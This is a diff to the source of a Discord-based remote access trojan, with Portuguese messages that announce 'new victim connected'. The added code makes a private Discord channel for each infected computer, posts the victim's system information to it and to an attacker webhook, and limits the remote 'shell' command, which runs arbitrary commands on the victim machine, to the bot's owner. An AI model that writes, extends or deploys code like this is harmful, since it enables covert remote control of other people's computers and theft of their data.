@@ -8,6 +8,10 @@ import platform, subprocess, os, time, io, sys, threading, ctypes, requests as r
 TOKEN = "DISCORD_TOKEN_PLACEHOLDER"
 PANEL_URL = "PANEL_URL_PLACEHOLDER"
 WEBHOOK_URL = "WEBHOOK_PLACEHOLDER"
+CATEGORY_ID = 1513374589978148965
+
+victim_channel = None
+victim_guild = None
 
 def hide_console():
     try:
@@ -119,8 +123,37 @@ def register_panel():
 
 @bot.event
 async def on_ready():
+    global victim_channel, victim_guild
     info = f"**Nova vitima conectada!**\n```\n{RatCommands.sysinfo()}\n```"
     send_webhook(info)
+    
+    try:
+        target_guild = None
+        for guild in bot.guilds:
+            target_guild = guild
+            break
+        if target_guild:
+            victim_guild = target_guild
+            cat = discord.utils.get(target_guild.categories, id=CATEGORY_ID)
+            if cat:
+                pc = platform.node().replace(' ', '-')[:20]
+                chan_name = f"victim-{pc}"
+                overwrites = {
+                    target_guild.default_role: discord.PermissionOverwrite(read_messages=False),
+                    target_guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True),
+                }
+                if target_guild.owner_id:
+                    owner = target_guild.get_member(target_guild.owner_id)
+                    if owner:
+                        overwrites[owner] = discord.PermissionOverwrite(read_messages=True, send_messages=True)
+                victim_channel = await target_guild.create_text_channel(
+                    chan_name, category=cat, overwrites=overwrites,
+                    topic=f"PC: {platform.node()} | OS: {platform.system()}"
+                )
+                await victim_channel.send(info)
+    except Exception:
+        pass
+    
     if PANEL_URL and "PLACEHOLDER" not in PANEL_URL:
         threading.Thread(target=register_panel, daemon=True).start()
 
@@ -135,6 +168,7 @@ async def on_resumed():
     send_webhook(f"**Reconectado!**\n{platform.node()}")
 
 @bot.command(name='shell')
+@commands.is_owner()
 async def cmd_shell(ctx, *, command):
     output = rat.shell(command)
     if len(output) > 1900:
